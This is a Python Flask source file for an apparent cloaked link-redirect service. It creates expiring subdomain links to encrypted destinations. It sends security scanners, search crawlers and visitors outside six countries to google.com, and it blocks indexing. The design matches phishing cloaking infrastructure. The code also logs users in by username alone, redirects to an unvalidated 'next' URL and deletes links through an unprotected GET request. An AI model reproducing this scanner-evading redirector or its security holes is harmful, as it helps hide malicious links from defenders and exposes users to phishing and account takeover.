from flask import Flask, request, redirect, render_template_string, abort, url_for, session, jsonify, make_response
from flask_wtf import FlaskForm, CSRFProtect
from wtforms import StringField, SubmitField, SelectField, BooleanField, HiddenField
from wtforms.validators import DataRequired, Length, Regexp, URL
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.backends import default_backend
import os
import base64
import json
import re
import urllib.parse
import secrets
import logging
import time
import random
from datetime import datetime, timedelta
import uuid
import hashlib
from valkey import Valkey
from functools import wraps
import requests
import bleach
from dotenv import load_dotenv
import ipaddress
import string
import sys

app = Flask(__name__)
load_dotenv()

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)
logger.debug("Initializing Flask app")

# Configuration values
FLASK_SECRET_KEY = os.getenv("FLASK_SECRET_KEY", secrets.token_hex(16))
WTF_CSRF_SECRET_KEY = os.getenv("WTF_CSRF_SECRET_KEY", secrets.token_hex(16))
AES_GCM_KEY = os.getenv("AES_GCM_KEY", secrets.token_bytes(32))
HMAC_KEY = os.getenv("HMAC_KEY", secrets.token_bytes(32))
VALKEY_HOST = os.getenv("VALKEY_HOST", "localhost")
VALKEY_PORT = int(os.getenv("VALKEY_PORT", 6379))
VALKEY_USERNAME = os.getenv("VALKEY_USERNAME", "")
VALKEY_PASSWORD = os.getenv("VALKEY_PASSWORD", "")
DATA_RETENTION_DAYS = 90
USER_TXT_URL = os.getenv("USER_TXT_URL", "https://example.com/users.txt")  # Replace with trusted source
ALLOWED_COUNTRIES = ['GB', 'CA', 'IE', 'US', 'AU', 'NZ']  # UK, Canada, Ireland, USA, Australia, New Zealand
GEOIP_API_URL = "https://ipapi.co/{ip}/json/"

# Bot detection patterns
BOT_UA_PATTERNS = [
    r'bot', r'crawler', r'spider', r'scanner', r'googlebot', r'bingbot', r'yahoo', r'baiduspider',
    r'yandex', r'sogou', r'exabot', r'ahrefs', r'majestic', r'semrush', r'curl', r'wget',
    r'python-requests', r'httpclient', r'zgrab', r'masscan', r'nmap', r'probe', r'sqlmap'
]

# Anti-bot settings
RISK_SCORE_THRESHOLD = 50
MAX_PAYLOAD_PADDING = 16
COOKIE_TOKEN_TTL = 600  # 10 minutes

# Verify keys at startup
try:
    if isinstance(AES_GCM_KEY, str):
        AES_GCM_KEY = AES_GCM_KEY.encode()
    if len(AES_GCM_KEY) != 32:
        raise ValueError("AES-GCM key must be 32 bytes")
    Cipher(algorithms.AES(AES_GCM_KEY), modes.GCM(secrets.token_bytes(12)), backend=default_backend())
    logger.debug("AES-GCM key validated successfully")
except Exception as e:
    logger.error(f"Invalid AES-GCM key: {str(e)}")
    raise ValueError(f"AES-GCM key initialization failed: {str(e)}")

try:
    if isinstance(HMAC_KEY, str):
        HMAC_KEY = HMAC_KEY.encode()
    if len(HMAC_KEY) != 32:
        raise ValueError("HMAC key must be 32 bytes")
    h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
    h.update(b"test")
    h.finalize()
    logger.debug("HMAC key validated successfully")
except Exception as e:
    logger.error(f"Invalid HMAC key: {str(e)}")
    raise ValueError(f"HMAC key initialization failed: {str(e)}")

# Flask configuration
app.config['SECRET_KEY'] = FLASK_SECRET_KEY
app.config['WTF_CSRF_SECRET_KEY'] = WTF_CSRF_SECRET_KEY
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=1)
app.config['PREFERRED_URL_SCHEME'] = 'https'
logger.debug("Flask configuration set successfully")

# CSRF protection
csrf = CSRFProtect(app)

# Security headers
@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; script-src 'self' https://cdn.tailwindcss.com; "
        "style-src 'self' https://cdn.tailwindcss.com; connect-src 'self' https://ipapi.co;"
    )
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Server'] = 'CustomServer'
    return response

# WTForms for login and URL generation
class LoginForm(FlaskForm):
    username = StringField('Username', validators=[
        DataRequired(message="Username is required"),
        Length(min=2, max=100, message="Username must be 2-100 characters"),
        Regexp(r'^[A-Za-z0-9_@.]+$', message="Username can only contain letters, numbers, _, @, or .")
    ])
    next_url = HiddenField('Next')
    submit = SubmitField('Login')

class GenerateURLForm(FlaskForm):
    subdomain = StringField('Subdomain', validators=[
        DataRequired(message="Subdomain is required"),
        Length(min=2, max=100, message="Subdomain must be 2-100 characters"),
        Regexp(r'^[A-Za-z0-9-]+$', message="Subdomain can only contain letters, numbers, or hyphens")
    ])
    destination_link = StringField('Destination Link', validators=[
        DataRequired(message="Destination link is required"),
        URL(message="Invalid URL format (must start with http:// or https://)")
    ])
    expiry = SelectField('Expiry', choices=[
        ('300', '5 Minutes'),
        ('3600', '1 Hour'),
        ('86400', '1 Day'),
        ('604800', '1 Week')
    ], default='3600')
    analytics_enabled = BooleanField('Enable Analytics')
    submit = SubmitField('Generate URL')

# Valkey initialization
valkey_client = None
try:
    valkey_client = Valkey(
        host=VALKEY_HOST,
        port=VALKEY_PORT,
        username=VALKEY_USERNAME,
        password=VALKEY_PASSWORD,
        decode_responses=True,
        ssl=True
    )
    valkey_client.ping()
    logger.debug("Valkey connection established successfully")
except Exception as e:
    logger.error(f"Valkey connection failed: {str(e)}")
    valkey_client = None

# Custom Jinja2 filter for datetime
def datetime_filter(timestamp):
    try:
        return datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
    except (TypeError, ValueError):
        return "Not Available"

app.jinja_env.filters['datetime'] = datetime_filter

# Bot and country check
def is_bot_request():
    ua = request.headers.get('User-Agent', '').lower()
    if any(re.search(pattern, ua, re.IGNORECASE) for pattern in BOT_UA_PATTERNS):
        logger.debug(f"Bot detected: {ua}")
        return True
    return False

def is_allowed_country(ip):
    try:
        response = requests.get(GEOIP_API_URL.format(ip=ip), timeout=5)
        response.raise_for_status()
        data = response.json()
        country_code = data.get('country_code', '')
        if country_code in ALLOWED_COUNTRIES:
            logger.debug(f"Allowed country: {country_code} for IP {ip}")
            return True
        logger.debug(f"Blocked country: {country_code} for IP {ip}")
        return False
    except Exception as e:
        logger.warning(f"Geolocation failed for IP {ip}: {str(e)}")
        return True  # Allow by default to avoid blocking legitimate users

# Payload encryption and obfuscation
def encrypt_payload(payload):
    try:
        payload_bytes = json.dumps(payload).encode('utf-8')
        padding_length = random.randint(8, MAX_PAYLOAD_PADDING)
        padding = secrets.token_bytes(padding_length)
        padded_payload = len(padding).to_bytes(4, 'big') + payload_bytes + padding
        iv = secrets.token_bytes(12)
        cipher = Cipher(algorithms.AES(AES_GCM_KEY), modes.GCM(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(padded_payload) + encryptor.finalize()
        encrypted = iv + ciphertext + encryptor.tag
        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
        h.update(encrypted)
        signature = h.finalize()
        result = f"{base64.urlsafe_b64encode(encrypted).decode()}.{base64.urlsafe_b64encode(signature).decode()}"
        logger.debug(f"Encrypted payload: {result[:20]}...")
        return result
    except Exception as e:
        logger.error(f"Payload encryption error: {str(e)}")
        raise ValueError(f"Encryption failed: {str(e)}")

def decrypt_payload(encrypted):
    try:
        parts = encrypted.split('.')
        if len(parts) != 2:
            raise ValueError("Invalid payload format")
        encrypted_data = base64.urlsafe_b64decode(parts[0])
        signature = base64.urlsafe_b64decode(parts[1])
        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
        h.update(encrypted_data)
        h.verify(signature)
        iv = encrypted_data[:12]
        tag = encrypted_data[-16:]
        ciphertext = encrypted_data[12:-16]
        cipher = Cipher(algorithms.AES(AES_GCM_KEY), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        padded_payload = decryptor.update(ciphertext) + decryptor.finalize()
        padding_length = int.from_bytes(padded_payload[:4], 'big')
        if padding_length > MAX_PAYLOAD_PADDING or len(padded_payload) < 4 + padding_length:
            raise ValueError("Invalid padding length")
        payload_bytes = padded_payload[4:-padding_length]
        result = json.loads(payload_bytes.decode('utf-8'))
        logger.debug(f"Decrypted payload: {result['student_link'][:50]}...")
        return result
    except Exception as e:
        logger.error(f"Payload decryption error: {str(e)}")
        raise ValueError(f"Decryption failed: {str(e)}")

# URL generation utilities
def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    return ''.join(secrets.choice(characters) for _ in range(length))

def get_valid_usernames():
    try:
        if valkey_client:
            cached = valkey_client.get("usernames")
            if cached:
                logger.debug("Retrieved usernames from Valkey cache")
                return json.loads(cached)
        response = requests.get(USER_TXT_URL, timeout=5)
        response.raise_for_status()
        usernames = [bleach.clean(line.strip()) for line in response.text.splitlines() if line.strip()]
        if valkey_client:
            valkey_client.setex("usernames", 3600, json.dumps(usernames))
            logger.debug("Cached usernames in Valkey")
        logger.debug(f"Fetched {len(usernames)} usernames")
        return usernames
    except Exception as e:
        logger.error(f"Error fetching usernames: {str(e)}")
        return []

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'username' not in session:
            logger.debug(f"Redirecting to login from {request.url}")
            return redirect(url_for('login', next=request.url))
        logger.debug(f"Authenticated user: {session['username']}")
        return f(*args, **kwargs)
    return decorated_function

def get_base_domain():
    try:
        host = request.host
        parts = host.split('.')
        return '.'.join(parts[-2:]) if len(parts) >= 2 else host
    except Exception as e:
        logger.error(f"Error getting base domain: {str(e)}")
        return "example.com"  # Replace with your domain

@app.before_request
def check_access():
    ip = request.remote_addr
    if is_bot_request():
        logger.info(f"Redirecting bot from IP {ip} to google.com")
        return redirect("https://www.google.com", code=302)
    if not is_allowed_country(ip):
        logger.info(f"Redirecting non-allowed country from IP {ip} to google.com")
        return redirect("https://www.google.com", code=302)

@app.route("/robots.txt", methods=["GET"])
def robots_txt():
    return render_template_string("""
User-agent: *
Disallow: /
    """), 200

@app.route("/login", methods=["GET", "POST"])
def login():
    try:
        form = LoginForm()
        if form.validate_on_submit():
            username = bleach.clean(form.username.data.strip())
            valid_usernames = get_valid_usernames()
            if username in valid_usernames:
                session['username'] = username
                session.permanent = True
                logger.debug(f"User {username} logged in")
                next_url = form.next_url.data or url_for('dashboard')
                return redirect(next_url)
            logger.warning(f"Invalid login attempt: {username}")
            form.username.errors.append("Invalid username")
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta name="robots" content="noindex, nofollow">
                <title>Login</title>
                <script src="https://cdn.tailwindcss.com"></script>
                <style>
                    body { background: linear-gradient(to bottom, #f3f4f6, #e5e7eb); color: #1f2937; }
                </style>
            </head>
            <body class="min-h-screen flex items-center justify-center p-4">
                <div class="w-full max-w-md bg-white p-8 rounded-lg shadow-lg">
                    <h1 class="text-2xl font-bold mb-6 text-center">Login</h1>
                    {% if form.errors %}
                        <p class="text-red-500 mb-4 text-center">
                            {% for field, errors in form.errors.items() %}
                                {% for error in errors %}
                                    {{ error }}<br>
                                {% endfor %}
                            {% endfor %}
                        </p>
                    {% endif %}
                    <form method="POST" class="space-y-4">
                        {{ form.csrf_token }}
                        {{ form.next_url(value=request.args.get('next', '')) }}
                        <div>
                            <label class="block text-sm font-medium">Username</label>
                            {{ form.username(class="mt-1 w-full p-2 border rounded focus:ring focus:ring-blue-300") }}
                        </div>
                        {{ form.submit(class="w-full bg-blue-600 text-white p-2 rounded hover:bg-blue-700") }}
                    </form>
                </div>
            </body>
            </html>
        """, form=form)
    except Exception as e:
        logger.error(f"Error in login: {str(e)}")
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-lg shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
                    <p class="text-gray-600">Something went wrong. Please try again later.</p>
                </div>
            </body>
            </html>
        """), 500

@app.route("/", methods=["GET"])
def index():
    try:
        if 'username' in session:
            return redirect(url_for('dashboard'))
        return redirect(url_for('login'))
    except Exception as e:
        logger.error(f"Error in index: {str(e)}")
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-lg shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
                    <p class="text-gray-600">Something went wrong. Please try again later.</p>
                </div>
            </body>
            </html>
        """), 500

@app.route("/dashboard", methods=["GET", "POST"])
@login_required
def dashboard():
    try:
        username = session['username']
        base_domain = get_base_domain()
        form = GenerateURLForm()
        error = None

        if form.validate_on_submit():
            subdomain = bleach.clean(form.subdomain.data.strip())
            destination_link = bleach.clean(form.destination_link.data.strip())
            analytics_enabled = form.analytics_enabled.data
            expiry = int(form.expiry.data)

            parsed_url = urllib.parse.urlparse(destination_link)
            if not parsed_url.scheme in ('http', 'https') or not parsed_url.netloc:
                error = "Invalid URL: Must be a valid http:// or https:// URL"
                logger.warning(f"Invalid destination_link: {destination_link}")

            if not error:
                token = generate_random_string(16)
                expiry_timestamp = int(time.time()) + expiry
                payload = {
                    "student_link": destination_link,
                    "timestamp": int(time.time() * 1000),
                    "expiry": expiry_timestamp
                }
                encrypted_payload = encrypt_payload(payload)
                generated_url = f"https://{urllib.parse.quote(subdomain)}.{base_domain}/r/{token}"
                url_id = hashlib.sha256(token.encode()).hexdigest()

                if valkey_client:
                    valkey_client.hset(f"user:{username}:url:{url_id}", mapping={
                        "url": generated_url,
                        "destination": destination_link,
                        "token": token,
                        "encrypted_payload": encrypted_payload,
                        "created": int(time.time()),
                        "expiry": expiry_timestamp,
                        "clicks": 0,
                        "analytics_enabled": "1" if analytics_enabled else "0"
                    })
                    valkey_client.setex(f"payload:{token}", expiry, encrypted_payload)
                    valkey_client.expire(f"user:{username}:url:{url_id}", DATA_RETENTION_DAYS * 86400)
                    logger.info(f"Generated URL for {username}: {generated_url}")
                    return redirect(url_for('dashboard'))
                else:
                    error = "Database unavailable"

        urls = []
        valkey_error = None
        if valkey_client:
            try:
                url_keys = valkey_client.keys(f"user:{username}:url:*")
                for key in url_keys:
                    url_data = valkey_client.hgetall(key)
                    if not url_data:
                        continue
                    url_id = key.split(':')[-1]
                    urls.append({
                        "url": url_data.get('url', ''),
                        "destination": url_data.get('destination', ''),
                        "created": datetime.fromtimestamp(int(url_data.get('created', 0))).strftime('%Y-%m-%d %H:%M:%S'),
                        "expiry": datetime.fromtimestamp(int(url_data.get('expiry', 0))).strftime('%Y-%m-%d %H:%M:%S'),
                        "clicks": int(url_data.get('clicks', 0)),
                        "analytics_enabled": url_data.get('analytics_enabled', '0') == '1',
                        "url_id": url_id
                    })
            except Exception as e:
                logger.error(f"Valkey error fetching URLs: {str(e)}")
                valkey_error = "Unable to fetch URL history"

        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta name="robots" content="noindex, nofollow">
                <title>Dashboard - {{ username }}</title>
                <script src="https://cdn.tailwindcss.com"></script>
                <style>
                    body { background: linear-gradient(to bottom, #f3f4f6, #e5e7eb); color: #1f2937; }
                    .card { transition: all 0.3s; }
                    .card:hover { transform: translateY(-5px); }
                    .error { color: #ef4444; }
                </style>
                <script>
                    function toggleAnalyticsSwitch(urlId, index) {
                        fetch('/toggle_analytics/' + urlId, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ csrf_token: "{{ form.csrf_token._value() }}" })
                        }).then(response => {
                            if (response.ok) {
                                let checkbox = document.getElementById('analytics-toggle-' + index);
                                checkbox.checked = !checkbox.checked;
                            } else {
                                alert('Failed to toggle analytics');
                            }
                        }).catch(error => {
                            console.error('Error:', error);
                            alert('Error toggling analytics');
                        });
                    }
                </script>
            </head>
            <body class="min-h-screen p-4">
                <div class="max-w-5xl mx-auto">
                    <h1 class="text-3xl font-bold mb-8 text-center">Welcome, {{ username }}</h1>
                    {% if form.errors %}
                        <p class="error p-4 mb-4 text-center">
                            {% for field, errors in form.errors.items() %}
                                {% for error in errors %}
                                    {{ error }}<br>
                                {% endfor %}
                            {% endfor %}
                        </p>
                    {% endif %}
                    {% if error %}
                        <p class="error p-4 mb-4 text-center">{{ error }}</p>
                    {% endif %}
                    {% if valkey_error %}
                        <p class="error p-4 mb-4 text-center">{{ valkey_error }}</p>
                    {% endif %}
                    <div class="card mb-8 bg-white p-6 rounded-lg shadow-lg">
                        <h2 class="text-xl font-bold mb-4">Generate New URL</h2>
                        <form method="POST" class="space-y-4">
                            {{ form.csrf_token }}
                            <div>
                                <label class="block text-sm font-medium">Subdomain</label>
                                {{ form.subdomain(class="mt-1 w-full p-2 border rounded focus:ring focus:ring-blue-300") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium">Destination Link</label>
                                {{ form.destination_link(class="mt-1 w-full p-2 border rounded focus:ring focus:ring-blue-300") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium">Expiry</label>
                                {{ form.expiry(class="mt-1 w-full p-2 border rounded focus:ring focus:ring-blue-300") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium">Enable Analytics</label>
                                {{ form.analytics_enabled(class="mt-1 p-2") }}
                            </div>
                            {{ form.submit(class="w-full bg-blue-600 text-white p-2 rounded hover:bg-blue-700") }}
                        </form>
                    </div>
                    <div class="card bg-white p-6 rounded-lg shadow-lg">
                        <h2 class="text-xl font-bold mb-4">URL History</h2>
                        {% if urls %}
                            {% for url in urls %}
                                <div class="card bg-gray-100 p-4 rounded mb-4">
                                    <h3 class="text-lg font-semibold">{{ url.destination }}</h3>
                                    <p class="text-gray-600 break-all"><strong>URL:</strong> <a href="{{ url.url }}" target="_blank" class="text-blue-600">{{ url.url }}</a></p>
                                    <p class="text-gray-600"><strong>Created:</strong> {{ url.created }}</p>
                                    <p class="text-gray-600"><strong>Expires:</strong> {{ url.expiry }}</p>
                                    <p class="text-gray-600"><strong>Clicks:</strong> {{ url.clicks }}</p>
                                    <div class="flex items-center mt-2">
                                        <label class="text-sm font-medium mr-2">Analytics:</label>
                                        <input type="checkbox" id="analytics-toggle-{{ loop.index }}" {% if url.analytics_enabled %}checked{% endif %} onchange="toggleAnalyticsSwitch('{{ url.url_id }}', '{{ loop.index }}')">
                                    </div>
                                    <div class="mt-2">
                                        <a href="/delete_url/{{ url.url_id }}" class="bg-red-600 text-white px-4 py-1 rounded hover:bg-red-700" onclick="return confirm('Are you sure?')">Delete</a>
                                    </div>
                                </div>
                            {% endfor %}
                        {% else %}
                            <p class="text-gray-600">No URLs generated yet.</p>
                        {% endif %}
                    </div>
                </div>
            </body>
            </html>
        """, username=username, form=form, urls=urls, error=error, valkey_error=valkey_error)
    except Exception as e:
        logger.error(f"Dashboard error for user {username}: {str(e)}")
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-lg shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
                    <p class="text-gray-600">Something went wrong. Please try again later.</p>
                </div>
            </body>
            </html>
        """), 500

@app.route("/toggle_analytics/<url_id>", methods=["POST"])
@login_required
@csrf.exempt
def toggle_analytics(url_id):
    try:
        username = session['username']
        data = request.get_json()
        if not data or 'csrf_token' not in data:
            logger.warning(f"Missing CSRF token for toggle_analytics: {url_id}")
            return jsonify({"status": "error", "message": "CSRF token required"}), 403
        form = GenerateURLForm(csrf_token=data['csrf_token'])
        if not form.validate_csrf_token(form.csrf_token):
            logger.warning(f"Invalid CSRF token for toggle_analytics: {url_id}")
            return jsonify({"status": "error", "message": "Invalid CSRF token"}), 403
        if valkey_client:
            key = f"user:{username}:url:{url_id}"
            if not valkey_client.exists(key):
                logger.warning(f"URL {url_id} not found for user {username}")
                return jsonify({"status": "error", "message": "URL not found"}), 404
            current = valkey_client.hget(key, "analytics_enabled")
            new_value = "0" if current == "1" else "1"
            valkey_client.hset(key, "analytics_enabled", new_value)
            logger.debug(f"Toggled analytics for URL {url_id} to {new_value}")
            return jsonify({"status": "ok"}), 200
        return jsonify({"status": "error", "message": "Database unavailable"}), 500
    except Exception as e:
        logger.error(f"Error in toggle_analytics: {str(e)}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500

@app.route("/delete_url/<url_id>", methods=["GET"])
@login_required
def delete_url(url_id):
    try:
        username = session['username']
        if valkey_client:
            key = f"user:{username}:url:{url_id}"
            token = valkey_client.hget(key, "token")
            if not valkey_client.exists(key):
                logger.warning(f"URL {url_id} not found for user {username}")
                abort(404, "URL not found")
            valkey_client.delete(key)
            if token:
                valkey_client.delete(f"payload:{token}")
            logger.debug(f"Deleted URL {url_id}")
            return redirect(url_for('dashboard'))
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-lg shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
                    <p class="text-gray-600">Database unavailable. Unable to delete URL.</p>
                </div>
            </body>
            </html>
        """), 500
    except Exception as e:
        logger.error(f"Error in delete_url: {str(e)}")
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-lg shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
                    <p class="text-gray-600">Something went wrong. Please try again later.</p>
                </div>
            </body>
            </html>
        """), 500

@app.route("/r/<token>", methods=["GET"], subdomain="<username>")
def redirect_handler(username, token):
    try:
        if not valkey_client:
            logger.warning("Valkey unavailable")
            return render_template_string("""
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>Error</title>
                    <script src="https://cdn.tailwindcss.com"></script>
                </head>
                <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                    <div class="bg-white p-8 rounded-lg shadow-lg max-w-sm w-full text-center">
                        <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
                        <p class="text-gray-600">Service unavailable. Please try again later.</p>
                    </div>
                </body>
                </html>
            """), 500

        encrypted_payload = valkey_client.get(f"payload:{token}")
        if not encrypted_payload:
            logger.warning(f"Invalid token: {token}")
            return render_template_string("""
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>Not Found</title>
                    <script src="https://cdn.tailwindcss.com"></script>
                </head>
                <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                    <div class="bg-white p-8 rounded-lg shadow-lg max-w-sm w-full text-center">
                        <h3 class="text-lg font-bold mb-4 text-red-600">Not Found</h3>
                        <p class="text-gray-600">The requested URL was not found.</p>
                    </div>
                </body>
                </html>
            """), 404

        payload = decrypt_payload(encrypted_payload)
        redirect_url = payload.get("student_link")
        expiry = payload.get("expiry", float('inf'))
        if not redirect_url or not re.match(r"^https?://", redirect_url):
            logger.error(f"Invalid redirect URL: {redirect_url}")
            return render_template_string("""
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>Error</title>
                    <script src="https://cdn.tailwindcss.com"></script>
                </head>
                <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                    <div class="bg-white p-8 rounded-lg shadow-lg max-w-sm w-full text-center">
                        <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
                        <p class="text-gray-600">Invalid redirect URL.</p>
                    </div>
                </body>
                </html>
            """), 400

        if time.time() > expiry:
            logger.warning("URL expired")
            if valkey_client:
                valkey_client.delete(f"payload:{token}")
            return render_template_string("""
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>Expired</title>
                    <script src="https://cdn.tailwindcss.com"></script>
                </head>
                <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                    <div class="bg-white p-8 rounded-lg shadow-lg max-w-sm w-full text-center">
                        <h3 class="text-lg font-bold mb-4 text-red-600">URL Expired</h3>
                        <p class="text-gray-600">This URL has expired.</p>
                    </div>
                </body>
                </html>
            """), 410

        url_id = hashlib.sha256(token.encode()).hexdigest()
        if valkey_client:
            analytics_enabled = valkey_client.hget(f"user:{username}:url:{url_id}", "analytics_enabled") == "1"
            if analytics_enabled:
                valkey_client.hincrby(f"user:{username}:url:{url_id}", "clicks", 1)
                logger.debug(f"Incremented click count for URL {url_id}")

        logger.info(f"Redirecting to {redirect_url}")
        return redirect(redirect_url, code=302)
    except Exception as e:
        logger.error(f"Error in redirect_handler: {str(e)}")
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-lg shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
                    <p class="text-gray-600">Something went wrong. Please try again later.</p>
                </div>
            </body>
            </html>
        """), 500

@app.route("/favicon.ico")
def favicon():
    return '', 204

@app.route("/<path:path>", methods=["GET"])
def catch_all(path):
    logger.warning(f"404 Not Found for path: {path}")
    return render_template_string("""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Not Found</title>
            <script src="https://cdn.tailwindcss.com"></script>
        </head>
        <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
            <div class="bg-white p-8 rounded-lg shadow-lg max-w-sm w-full text-center">
                <h3 class="text-lg font-bold mb-4 text-red-600">Not Found</h3>
                <p class="text-gray-600">The requested URL was not found.</p>
            </div>
        </body>
        </html>
    """), 404

if __name__ == "__main__":
    try:
        app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)), debug=False)
    except Exception as e:
        logger.error(f"Error starting Flask app: {str(e)}")
        sys.exit(1)
